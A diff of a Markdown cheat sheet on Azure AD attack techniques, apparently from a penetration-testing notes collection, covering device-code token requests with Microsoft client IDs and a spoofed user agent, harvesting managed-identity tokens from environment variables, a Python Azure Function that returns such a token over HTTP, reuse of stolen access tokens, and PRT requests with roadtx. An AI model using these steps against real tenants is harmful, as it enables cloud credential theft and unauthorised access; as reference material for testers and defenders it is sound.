@@ -2,7 +2,18 @@
 
 ## Connection
 
+When you authenticate to the Microsoft Graph API in PowerShell/CLI, you will be using an application from a Microsoft's tenant.
+
+* [Microsoft Applications ID](https://learn.microsoft.com/fr-fr/troubleshoot/azure/active-directory/verify-first-party-apps-sign-in)
+
+| Name                       | Application ID                       |
+|----------------------------|--------------------------------------|
+| Microsoft Azure PowerShell | 1950a258-227b-4e31-a9cf-717495945fc2 |	
+| Microsoft Azure CLI	     | 04b07795-8ddb-461a-bbee-02f9e1bf7b46 |
+| Portail Azure              | c44b4083-3bb0-49c1-b47d-974e53cbdf3c |	
+
 After a successfull authentication, you will get an access token.
+
 
 ### az cli
 
@@ -54,7 +65,15 @@ Whoami equivalent: `az ad signed-in-user show`
 
 ### Microsoft Graph Powershell
 
-* Login  with credentials
+* Login with credentials
+    ```ps1
+    Connect-MgGraph
+    Connect-MgGraph -Scopes "User.Read.All", "Group.ReadWrite.All"
+    ```
+* Login with device code flow
+    ```ps1
+    Connect-MgGraph -Scopes "User.Read.All", "Group.ReadWrite.All" -UseDeviceAuthentication
+    ```
 
 Whoami equivalent: `Get-MgContext`
 
@@ -64,31 +83,41 @@ Whoami equivalent: `Get-MgContext`
 * Login with credentials
     ```ps1
     ```
+* Login with device code flow
+    ```ps1
+    # paste this in a PowerShell console
+    $body = @{
+        "client_id" =     "1950a258-227b-4e31-a9cf-717495945fc2"!
+        "resource" =      "https://graph.microsoft.com"
+    }
+    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
+    $Headers=@{}
+    $Headers["User-Agent"] = $UserAgent
+    $authResponse = Invoke-RestMethod `
+        -UseBasicParsing `
+        -Method Post `
+        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
+        -Headers $Headers `
+        -Body $body
+    $authResponse
 
+    # then browse to https://microsoft.com/devicelogin and use the device_code
+    # finally execute this command to ask for tokens
+    $body=@{
+        "client_id" =  "1950a258-227b-4e31-a9cf-717495945fc2"
+        "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
+        "code" =       $authResponse.device_code
+    }
+    $Tokens = Invoke-RestMethod `
+        -UseBasicParsing `
+        -Method Post `
+        -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
+        -Headers $Headers `
+        -Body $body
+    $Tokens
+    ```
 
-### Internal HTTP API
-
-> **MSI_ENDPOINT** is an alias for **IDENTITY_ENDPOINT**, and **MSI_SECRET** is an alias for **IDENTITY_HEADER**.
-
-Find `IDENTITY_HEADER` and `IDENTITY_ENDPOINT` from the environment : `env`
-
-Most of the time, you want a token for one of these resources: 
-* https://storage.azure.com
-* https://vault.azure.net
-* https://graph.microsoft.com
-* https://management.azure.com
-
-```ps1
-curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
-curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
-```
-
-
-## Access Token
-
-Decode access tokens: [jwt.ms](https://jwt.ms/)
-
-* Request an access token using a service principal password
+* Request an access token using a **service principal password**
     ```ps1
     curl --location --request POST 'https://login.microsoftonline.com/<tenant-name>/oauth2/v2.0/token' \
     --header 'Content-Type: application/x-www-form-urlencoded' \
@@ -97,25 +126,76 @@ Decode access tokens: [jwt.ms](https://jwt.ms/)
     --data-urlencode 'client_secret=<client-secret>' \
     --data-urlencode 'grant_type=client_credentials'
     ```
-* Use the access token with MgGraph
+
+### Internal HTTP API
+
+> **MSI_ENDPOINT** is an alias for **IDENTITY_ENDPOINT**, and **MSI_SECRET** is an alias for **IDENTITY_HEADER**.
+
+Find `IDENTITY_HEADER` and `IDENTITY_ENDPOINT` from the environment variables: `env`
+
+Most of the time, you want a token for one of these resources: 
+
+* https://graph.microsoft.com
+* https://management.azure.com
+* https://storage.azure.com
+* https://vault.azure.net
+
+
+* PowerShell
+    ```ps1
+    curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
+    curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
+    ```
+* Azure Function (Python)
+    ```py
+    import logging, os
+    import azure.functions as func
+
+    def main(req: func.HttpRequest) -> func.HttpResponse:
+        logging.info('Python HTTP trigger function processed a request.')
+        IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
+        IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
+        cmd = 'curl "%s?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+        val = os.popen(cmd).read()
+        return func.HttpResponse(val, status_code=200)
+    ```
+
+
+## Access Token
+
+An access token is a type of security token issued by Azure Active Directory (Azure AD) that grants a user or application permission to access resources. These resources could be anything from APIs, web applications, data stored in Azure, or other services that are integrated with Azure AD for authentication and authorization.
+
+Decode access tokens: [jwt.ms](https://jwt.ms/)
+
+* Use the access token with **MgGraph**
     ```ps1
     # use the jwt
     $token = "eyJ0eXAiO..."
     $secure = $token | ConvertTo-SecureString -AsPlainText -Force
     Connect-MgGraph -AccessToken $secure
-
-    # whoami
-    Get-MgContext
-    Disconnect-MgGraph
     ```
-* Use the access token with AzureAD
+* Use the access token with **AzureAD**
     ```powershell
     Connect-AzureAD -AadAccessToken <access-token> -TenantId <tenant-id> -AccountId <account-id>
     ```
-* Use the access token with Az Powershell
+* Use the access token with **Az Powershell**
     ```powershell
     Connect-AzAccount -AccessToken <access-token> -AccountId <account-id>
     Connect-AzAccount -AccessToken <access-token> -GraphAccessToken <graph-access-token> -AccountId <account-id>
+    ```
+* Use the access token with the **API**
+    ```powershell
+    $Token = 'eyJ0eX..'
+    $URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
+    # $URI = 'https://graph.microsoft.com/v1.0/applications'
+    $RequestParams = @{
+        Method = 'GET'
+        Uri = $URI
+        Headers = @{
+            'Authorization' = "Bearer $Token"
+        }
+    }
+    (Invoke-RestMethod @RequestParams).value 
     ```
 
 
@@ -125,7 +205,6 @@ Decode access tokens: [jwt.ms](https://jwt.ms/)
     ```ps1
     TODO
     ```
-* 
 
 
 ### Get a Refresh Token from ESTSAuth Cookie
@@ -270,61 +349,6 @@ Use the user account to create a computer and request a PRT
 
 * Request a special refresh token: `roadtx prtenrich -u username@domain`
 * Request a PRT with MFA claim: `roadtx prt -r <refreshtoken> -c <device>.pem -k <device>.key`
-
-
-
-
-## Authenticate to the Microsoft Graph API in PowerShell
-
-* [Microsoft Applications ID](https://learn.microsoft.com/fr-fr/troubleshoot/azure/active-directory/verify-first-party-apps-sign-in)
-
-| Name                       | GUID                                 |
-|----------------------------|--------------------------------------|
-| Microsoft Azure PowerShell | 1950a258-227b-4e31-a9cf-717495945fc2 |	
-| Microsoft Azure CLI	     | 04b07795-8ddb-461a-bbee-02f9e1bf7b46 |
-| Portail Azure              | c44b4083-3bb0-49c1-b47d-974e53cbdf3c |	
-
-
-### Graph API Refresh Token
-
-Authenticating to the Microsoft Graph API in PowerShell
-
-```ps1
-$body = @{
-    "client_id" =     "1950a258-227b-4e31-a9cf-717495945fc2"
-    "resource" =      "https://graph.microsoft.com" # Microsoft Graph API 
-}
-$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
-$Headers=@{}
-$Headers["User-Agent"] = $UserAgent
-$authResponse = Invoke-RestMethod `
-    -UseBasicParsing `
-    -Method Post `
-    -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
-    -Headers $Headers `
-    -Body $body
-$authResponse
-```
-
-
-### Graph API Access Token
-
-This request require getting the Refresh Token.
-
-```ps1
-$body=@{
-    "client_id" =  "1950a258-227b-4e31-a9cf-717495945fc2"
-    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
-    "code" =       $authResponse.device_code
-}
-$Tokens = Invoke-RestMethod `
-    -UseBasicParsing `
-    -Method Post `
-    -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
-    -Headers $Headers `
-    -Body $body
-$Tokens
-```
 
 
 ## References
